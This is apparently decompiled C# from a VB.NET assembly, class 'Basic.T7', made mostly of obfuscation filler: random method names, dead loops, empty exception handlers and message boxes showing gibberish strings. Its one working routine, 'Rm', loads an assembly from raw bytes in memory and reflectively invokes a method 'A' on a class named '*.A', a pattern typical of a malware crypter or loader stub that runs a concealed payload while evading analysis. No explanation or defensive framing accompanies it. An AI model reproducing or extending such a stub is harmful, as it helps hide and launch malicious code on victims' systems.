using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Basic;

public class T7
{
	private void s8V0G9()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			while (true)
			{
				for (int i = 834817; i <= 22629; i++)
				{
				}
				int num = 5433606;
				do
				{
					try
					{
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						new decimal(430L);
						while (true)
						{
						}
					}
					num++;
				}
				while (num <= 9161640);
				Interaction.MsgBox((object)"fPJ1jxY", (MsgBoxStyle)0, (object)null);
			}
		}
	}

	public static object Rm(byte[] AssemblyName, object[] args)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		int num = 0;
		Type type;
		object result = default(object);
		while (true)
		{
			if (num < types.Length)
			{
				type = types[num];
				if (type.IsClass && type.FullName!.EndsWith(".A"))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return result;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), args));
	}

	public void P09d486yHl796KX217()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		MessageBox.Show(":fD+‘…$‚PŒ\u008f(<D‡xqm:g9Ž‚6P.eFc3W^^@_J5‹’Œ\u007f\u008fNiZ?J‘wƒ„\u008f` O>v.m‚@p?<TP]\u008fw]bym@z=`9n0vfasBZ‘]ƒAg'=/l.p24*uN9:@+B?82q]R],l/^\u008dŒQ’+U‰[\\]gl");
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			MessageBox.Show("w]z\u00815#‡…1‰….b)SeF8A3d>=yb#/O‚MJˆ…_…9k");
			new decimal(288858L);
			while (true)
			{
				for (int i = 9229546; i <= 5; i = checked(i + 1))
				{
				}
				try
				{
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
